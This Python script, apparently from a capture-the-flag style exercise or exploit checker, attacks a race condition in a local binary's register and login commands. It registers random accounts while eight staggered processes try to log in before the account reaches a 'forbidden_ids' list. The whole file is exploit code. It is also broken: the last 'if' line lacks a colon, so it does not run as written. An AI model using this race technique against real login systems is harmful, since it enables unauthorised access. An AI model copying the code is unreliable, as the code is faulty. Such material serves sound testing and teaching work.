import subprocess
from multiprocessing import Process, Value
import random, string
import time


def run_cmd(cmd_list):
	child = subprocess.Popen(cmd_list, stdout=subprocess.PIPE)
	streamdata = child.communicate()[0]
	ret = child.returncode
	return streamdata.decode(), ret


def random_string(size):
	return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))


def do_login(user, password, binary, time_to_sleep, is_exploitable):
	time.sleep(time_to_sleep)
	streamdata, ret = run_cmd([binary, "login", user, password])
	if "You are logged in. And congratz " in streamdata:
		is_exploitable.value = is_exploitable.value + 1


def do_register(user, password, binary):
	_, _ = run_cmd([binary, "register", user, password])


# return false if the code is not exploitable anymore
def exploit(binary, randomize):
	not_more_than = 6
	is_exploitable = Value('i', 0)
	while is_exploitable.value == 0:
		user = random_string(25)
		password = random_string(25)
		register = Process(target=do_register, args=(user,password,binary,))
		login1 = Process(target=do_login, args=(user,password,binary,0,is_exploitable,))
		login2 = Process(target=do_login, args=(user,password,binary,0.15,is_exploitable,))
		login3 = Process(target=do_login, args=(user,password,binary,0.25,is_exploitable,))
		login4 = Process(target=do_login, args=(user,password,binary,0.30,is_exploitable,))
		login5 = Process(target=do_login, args=(user,password,binary,0.35,is_exploitable,))
		login6 = Process(target=do_login, args=(user,password,binary,0.40,is_exploitable,))
		login7 = Process(target=do_login, args=(user,password,binary,0.45,is_exploitable,))
		login8 = Process(target=do_login, args=(user,password,binary,0.50,is_exploitable,))
		register.start()
		login1.start()
		login2.start()
		login3.start()
		login4.start()
		login5.start()
		login6.start()
		login7.start()
		login8.start()
		login1.join()
		login2.join()
		login3.join()
		login4.join()
		login5.join()
		login6.join()
		login7.join()
		login8.join()
		register.join()
		not_more_than -= 1
		if not_more_than <= 0:
			break
	if is_exploitable.value > 0
		print("I am quick enough to log in before inserting in forbidden_ids.")
		return True
	return False
